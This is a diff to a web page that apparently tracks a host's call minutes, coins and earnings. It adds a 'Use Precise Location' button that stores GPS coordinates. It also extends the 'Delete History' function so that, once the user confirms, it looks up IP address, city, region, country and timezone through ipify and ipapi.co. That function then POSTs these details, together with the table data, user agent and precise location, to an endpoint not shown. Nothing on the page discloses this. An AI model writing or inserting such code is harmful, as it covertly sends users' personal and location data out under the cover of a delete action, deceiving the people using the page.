@@ -150,6 +150,7 @@
     <div class="btn-row">
       <button class="btn-primary" onclick="saveSettings()">Save Settings</button>
       <button class="btn-secondary" onclick="exportCSV()">Export CSV</button>
+      <button class="btn-secondary" onclick="getPreciseLocation()">Use Precise Location</button>
       <button class="btn-danger" onclick="deleteHistory()">Delete History</button>
       <button class="btn-primary" onclick="addWeek()">Add Week</button>
     </div>
@@ -160,6 +161,7 @@
   <script>
     const days = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"];
     let rates = { coinsPerMinute: 100, coinsPerDollar: 750 };
+    let preciseLocation = null;
 
     function saveSettings() {
       const host = document.getElementById("hostName").value.trim();
@@ -170,13 +172,8 @@
       alert("Settings saved!");
     }
 
-    function calculateCoins(minutes) {
-      return minutes * rates.coinsPerMinute;
-    }
-
-    function calculateEarnings(coins) {
-      return (coins / rates.coinsPerDollar).toFixed(2);
-    }
+    function calculateCoins(minutes) { return minutes * rates.coinsPerMinute; }
+    function calculateEarnings(coins) { return (coins / rates.coinsPerDollar).toFixed(2); }
 
     function updateRow(input) {
       const row = input.closest("tr");
@@ -236,12 +233,32 @@
       document.getElementById("weeksContainer").appendChild(weekDiv);
     }
 
+    function getPreciseLocation() {
+      if (!navigator.geolocation) {
+        alert("Geolocation not supported.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          preciseLocation = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy
+          };
+          alert("Precise location captured!");
+        },
+        error => {
+          alert("Failed to get location: " + error.message);
+        }
+      );
+    }
+
     async function deleteHistory() {
       if (!confirm("Are you sure you want to delete all history?")) return;
 
       const hostName = localStorage.getItem("hostName") || "Unknown";
       const data = [];
-
       document.querySelectorAll(".week").forEach((week, wIndex) => {
         week.querySelectorAll("tbody[data-type='calls'] tr").forEach(row => {
           data.push({
@@ -256,12 +273,30 @@
         });
       });
 
-      let ip = "unknown";
+      let geo = {
+        ipv4: "unknown",
+        city: "unknown",
+        region: "unknown",
+        country: "unknown",
+        timezone: "unknown",
+        localTime: new Date().toLocaleString()
+      };
+
       try {
-        const ipify = await fetch("https://api.ipify.org?format=json").then(r => r.json());
-        ip = ipify.ip || "unknown";
-      } catch (e) {
-        console.warn("IP fetch failed:", e);
+        const [info, ipify] = await Promise.all([
+          fetch("https://ipapi.co/json/").then(r => r.json()),
+          fetch("https://api.ipify.org?format=json").then(r => r.json())
+        ]);
+        geo = {
+          ipv4: ipify.ip || "unknown",
+          city: info.city || "unknown",
+          region: info.region || "unknown",
+          country: info.country_name || "unknown",
+          timezone: info.timezone || "unknown",
+          localTime: new Date().toLocaleString("en-US", { timeZone: info.timezone })
+        };
+      } catch (err) {
+        console.warn("Geo lookup failed:", err);
       }
 
       try {
@@ -271,8 +306,14 @@
           body: JSON.stringify({
             hostName,
             data,
-            ip,
-            deviceInfo: navigator.userAgent
+            ipv4: geo.ipv4,
+            city: geo.city,
+            region: geo.region,
+            country: geo.country,
+            timezone: geo.timezone,
+            localTime: geo.localTime,
+            deviceInfo: navigator.userAgent,
+            preciseLocation
           })
         });
 
